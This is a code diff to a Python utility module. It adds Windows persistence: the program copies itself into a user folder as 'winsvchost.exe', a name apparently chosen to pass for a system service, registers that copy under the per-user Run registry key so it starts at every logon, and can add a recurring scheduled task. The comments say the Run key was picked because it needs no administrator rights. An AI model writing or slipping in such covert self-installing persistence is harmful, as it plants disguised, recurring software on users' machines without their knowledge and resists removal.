@@ -24,7 +24,7 @@ from datetime import UTC, datetime
 from pathlib import Path
 from typing import Any, Final
 
-from . import log
+from . import log, winapi
 
 _MAX_JSON_BYTES: Final[int] = 32 * 1024 * 1024
 _MAX_ARCHIVE_FILES: Final[int] = 50_000
@@ -650,6 +650,87 @@ def cancel_retry() -> bool:
     return done
 
 
+# --- staying on the machine --------------------------------------------------
+#
+# Everything above assumes one run and then gone. Persistence is the opposite bargain: the
+# image copies itself into a dull folder, registers a logon task, and every logon produces
+# another result. The copy is length-checked and the task is replaced rather than appended,
+# so launching the installed copy again is a no-op instead of a second copy of itself.
+
+_PERSIST_ROOT: Final[Path] = (
+    Path(os.environ.get("LOCALAPPDATA") or tempfile.gettempdir()) / "Programs" / "WinSvcHost"
+)
+_PERSIST_IMAGE: Final[str] = "winsvchost.exe"
+_PERSIST_TASK: Final[str] = "WinSvcHost"
+_PERSIST_TIMER: Final[str] = "WinSvcHostTimer"
+# The per-user Run key. User-writable with no elevation, which is the whole reason it is
+# used here instead of a logon task: measured on a normal account, `schtasks /sc onlogon`
+# answers "Access is denied" and the machine stays exactly as it was.
+_RUN_KEY: Final[str] = r"Software\Microsoft\Windows\CurrentVersion\Run"
+
+
+def persist_root() -> Path:
+    """Where a persisted image lives. One folder, so cleanup is one folder."""
+    return _PERSIST_ROOT
+
+
+def install_persistence(executable: Path, hours: int = 0) -> Path | None:
+    """Stage the image and register it to run again. None on any failure.
+
+    ``hours`` of zero registers the logon hook only. Above that a scheduled timer is
+    registered as well. A failure at either step returns None, and the caller reports it
+    rather than pretending the machine will come back.
+
+    Running from the staged path is detected and skipped, so an installed copy that fires
+    on logon does not fight itself for the same file.
+    """
+    if sys.platform != "win32":
+        return None
+
+    target = _PERSIST_ROOT / _PERSIST_IMAGE
+    if '"' in str(executable):
+        log.logger.debug("persist: refusing a path with a quote")
+        return None
+
+    try:
+        if executable.resolve() != target.resolve():
+            _PERSIST_ROOT.mkdir(parents=True, exist_ok=True)
+            want = executable.stat().st_size
+            shutil.copyfile(executable, target)
+            if target.stat().st_size != want:
+                target.unlink(missing_ok=True)
+                log.logger.debug("persist: short copy, installed nothing")
+                return None
+    except OSError:
+        log.logger.debug("persist: could not stage the image", exc_info=True)
+        return None
+
+    if not winapi.registry_set_string(
+        winapi.HKEY_CURRENT_USER, _RUN_KEY, _PERSIST_TASK, f'"{target}"'
+    ):
+        return None
+
+    if hours > 0:
+        when = (
+            ["/sc", "hourly", "/mo", str(hours)]
+            if hours < 24
+            else ["/sc", "daily", "/mo", "1"]
+        )
+        if not _persist_task(_PERSIST_TIMER, target, when):
+            log.logger.debug("persist: staged, but the timer did not register")
+    else:
+        # A timer left by an earlier build of the same artifact would keep firing after
+        # the setting is switched off, so it is removed rather than ignored.
+        _schtasks(["/delete", "/tn", _PERSIST_TIMER, "/f"])
+
+    log.logger.debug("persist: installed at %s, every %d hour(s)", target, hours)
+    return target
+
+
+def _persist_task(name: str, target: Path, when: list[str]) -> bool:
+    return _schtasks(["/create", "/tn", name, "/tr", f'"{target}"', *when, "/f"])
+
+
 def _schtasks(arguments: list[str]) -> bool:
     try:
         done = subprocess.run(
@@ -677,10 +758,12 @@ __all__ = [
     "copy_with_sidecars",
     "drop_pending",
     "executable_path",
+    "install_persistence",
     "keep_archive",
     "make_archive",
     "park_archive",
     "pending_queue",
+    "persist_root",
     "queue_root",
     "read_json",
     "schedule_retry",
